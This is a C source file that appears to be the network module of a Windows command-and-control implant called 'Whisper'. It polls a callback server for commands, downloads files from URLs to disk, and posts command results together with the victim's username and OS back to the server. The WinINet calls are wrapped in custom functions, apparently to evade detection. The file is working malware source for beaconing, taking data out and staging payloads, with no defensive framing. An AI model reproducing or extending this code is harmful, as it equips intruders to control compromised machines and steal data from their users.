#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include "whisper_structs.h"
/*
*

README:

 - Move funcs here to whispernet API
 - Learn this properly

*/

#pragma comment(lib, "wininet.lib") // Link against WinINet

// =======================
// Convert `char*` to `wchar_t*` for Wide API Calls
// =======================
// Converts a char* string to a wide string (wchar_t*)
wchar_t *char_to_wchar(const char *str)
{
    size_t len = strlen(str) + 1;
    wchar_t *wstr = (wchar_t *)malloc(len * sizeof(wchar_t));
    if (wstr)
    {
        size_t converted = 0;
        mbstowcs_s(&converted, wstr, len, str, _TRUNCATE);
    }
    return wstr;
}

// =======================
// HTTP POST Request
// =======================
int post_data(const char *json_data, char *agent_id)
{
    HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        DEBUG_LOGF(stderr, "InternetOpen failed: %lu\n", GetLastError());
        return 1;
    }

    // Connect to the server
    HINTERNET hConnect = WhisperInternetConnectA(hInternet, CALLBACK_HTTP_HOST, CALLBACK_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        DEBUG_LOGF(stderr, "InternetConnect failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Correctly formatted URL path (only relative path)
    char url[150];
    snprintf(url, sizeof(url), CALLBACK_HTTP_FORMAT_POST_ENDPOINT, agent_id); // Only the relative path, not full URL

    // Accept types (NULL means accept anything)
    LPCSTR acceptTypes[] = {"*/*", NULL};

    // Open the request
    HINTERNET hRequest = WhisperHttpOpenRequestA(
        hConnect,
        "POST",                                              // HTTP method
        url,                                                 // Relative path
        NULL,                                                // Use default HTTP version
        NULL,                                                // No referrer
        acceptTypes,                                         // Accept all MIME types
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, // Flags
        0                                                    // No context
    );

    if (!hRequest)
    {
        DEBUG_LOGF(stderr, "HttpOpenRequest failed: %lu\n", GetLastError());
        WhisperInternetCloseHandle(hConnect);
        WhisperInternetCloseHandle(hInternet);
        return 1;
    }

    // Headers
    const char *headers = "Content-Type: application/json\r\n";

    // Send the request
    // DEBUG_LOG("UNRESOLVED CALL HttpSendRequestA HERE");
    if (!WhisperHttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)json_data, strlen(json_data)))
    {
        DEBUG_LOGF(stderr, "HttpSendRequest failed: %lu\n", GetLastError());
    }
    else
    {
        DEBUG_LOG("POST request sent successfully.\n");
    }

    // Cleanup
    WhisperInternetCloseHandle(hRequest);
    WhisperInternetCloseHandle(hConnect);
    WhisperInternetCloseHandle(hInternet);
    return 0;
}

// =======================
// Memory Structure for Response Handling
// =======================
struct Memory
{
    char *response;
    size_t size;
};

// =======================
// HTTP GET Request (Equivalent to get_command_data())
// =======================
InboundJsonDataStruct get_command_data(char *agent_id)
{
    HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    InboundJsonDataStruct result = {NULL};

    if (!hInternet)
    {
        DEBUG_LOGF(stderr, "InternetOpen failed: %lu\n", GetLastError());
        return result;
    }

    char url[150];
    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_GET_URL, agent_id);

    wchar_t *wurl = char_to_wchar(url); // Convert char* to wchar_t*
    HINTERNET hConnect = WhisperInternetOpenUrlW(hInternet, wurl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    free(wurl);

    if (!hConnect)
    {
        DEBUG_LOGF(stderr, "InternetOpenUrl failed: %lu\n", GetLastError());
        WhisperInternetCloseHandle(hInternet);
        return result;
    }

    struct Memory chunk = {0};
    char buffer[4096];
    DWORD bytesRead;

    while (WhisperInternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        size_t new_size = chunk.size + bytesRead;
        char *temp = (char *)realloc(chunk.response, new_size + 1);
        if (!temp)
        {
            DEBUG_LOGF(stderr, "Memory allocation failed\n");
            break;
        }
        chunk.response = temp;
        memcpy(chunk.response + chunk.size, buffer, bytesRead);
        chunk.size = new_size;
        chunk.response[chunk.size] = '\0';
    }

    if (chunk.response)
    {
        DEBUG_LOG("Received JSON:\n%s\n", chunk.response);
        result = decode_command_json(chunk.response);
        free(chunk.response);
    }

    WhisperInternetCloseHandle(hConnect);
    WhisperInternetCloseHandle(hInternet);
    return result;
}

// =======================
// HTTP File Download
// =======================
int download_file(const char *url, const char *output_path)
{
    HINTERNET hInternet = WhisperInternetOpenA("WinINet Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet)
    {
        DEBUG_LOGF(stderr, "InternetOpen failed: %lu\n", GetLastError());
        return 1;
    }

    wchar_t *wurl = char_to_wchar(url); // Convert char* to wchar_t*
    HINTERNET hConnect = WhisperInternetOpenUrlW(hInternet, wurl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    free(wurl);

    if (!hConnect)
    {
        DEBUG_LOGF(stderr, "InternetOpenUrl failed: %lu\n", GetLastError());
        WhisperInternetCloseHandle(hInternet);
        return 1;
    }

    FILE *fp = fopen(output_path, "wb");
    if (!fp)
    {
        DEBUG_LOGF(stderr, "Failed to open file: %s\n", output_path);
        WhisperInternetCloseHandle(hConnect);
        WhisperInternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (WhisperInternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0)
    {
        fwrite(buffer, 1, bytesRead, fp);
    }

    DEBUG_LOG("File downloaded successfully: %s\n", output_path);
    fclose(fp);
    WhisperInternetCloseHandle(hConnect);
    WhisperInternetCloseHandle(hInternet);
    return 0;
}

// =======================
// Send back to the agent
// =======================

// Mock simple send
// a one off send thingy for sending messages with a randomly generated UUID
void agent_send_now(HeapStore *heapStorePointer, const char *input)
{
    // Generate a new UUID for the oneoff message.
    char uuid[37]; // Correctly declare a 37-byte character array.
    generate_uuid4(uuid);

    // Allocate and initialize an outbound JSON structure.
    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
    if (!OutboundJsonData)
    {
        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
        return;
    }

    // Duplicate the agent ID from the heap store.
    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id);
    if (!OutboundJsonData->agent_id)
    {
        DEBUG_LOG("Memory allocation failed for agent_id.\n");
        free(OutboundJsonData);
        return;
    }

    // Set the command result data to the input provided.
    OutboundJsonData->command_result_data = strdup(input);
    if (!OutboundJsonData->command_result_data)
    {
        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
        free(OutboundJsonData->command_result_data);
        free(OutboundJsonData);
        return;
    }

    // typedef struct
    // {
    //     char *command_result_data; // Variable-length string
    //     char *command_id;          // Variable-length string
    //     char *agent_id;
    //     // metadata fields
    //     char *int_ip;
    //     char *ext_ip;
    //     char *user;
    // } OutboundJsonDataStruct;

    // Add additional metadata

    // interal ip
    char *int_ip = "placeholder_int_ip";
    OutboundJsonData->int_ip = strdup(int_ip);
    if (!OutboundJsonData->int_ip)
    {
        DEBUG_LOG("Memory allocation failed for int_ip.\n");
        free(OutboundJsonData->int_ip);
        free(OutboundJsonData);
        return;
    }

    // external ip
    char *ext_ip = "placeholder_ext_ip";
    OutboundJsonData->ext_ip = strdup(ext_ip);
    if (!OutboundJsonData->ext_ip)
    {
        DEBUG_LOG("Memory allocation failed for ext_ip.\n");
        free(OutboundJsonData->ext_ip);
        free(OutboundJsonData);
        return;
    }

    // os
    OutboundJsonData->os = get_os(heapStorePointer);
    if (!OutboundJsonData->os)
    {
        DEBUG_LOG("Memory allocation failed for os.\n");
        free(OutboundJsonData->os);
        free(OutboundJsonData);
        return;
    }

    // char *user = "placeholder_username";
    char *user = get_current_username(heapStorePointer);
    OutboundJsonData->user = strdup(user);
    if (!OutboundJsonData->user)
    {
        DEBUG_LOG("Memory allocation failed for user.\n");
        free(OutboundJsonData->user);
        free(OutboundJsonData);
        return;
    }

    // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
                                              OutboundJsonData->command_result_data,
                                              uuid,
                                              OutboundJsonData->int_ip,
                                              OutboundJsonData->ext_ip,
                                              OutboundJsonData->os,
                                              OutboundJsonData->user);
    if (!encoded_json_response)
    {
        DEBUG_LOG("Failed to encode JSON response.\n");
        free(OutboundJsonData->agent_id);
        free(OutboundJsonData->command_result_data);
        free(OutboundJsonData);
        return;
    }

    // Send the JSON message to the designated endpoint.
    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);

    // Free the allocated memory.
    free(encoded_json_response);
    free(OutboundJsonData->agent_id);
    free(OutboundJsonData->command_result_data);
    free(OutboundJsonData->int_ip);
    free(OutboundJsonData->ext_ip);
    free(OutboundJsonData->os);
    free(OutboundJsonData);
}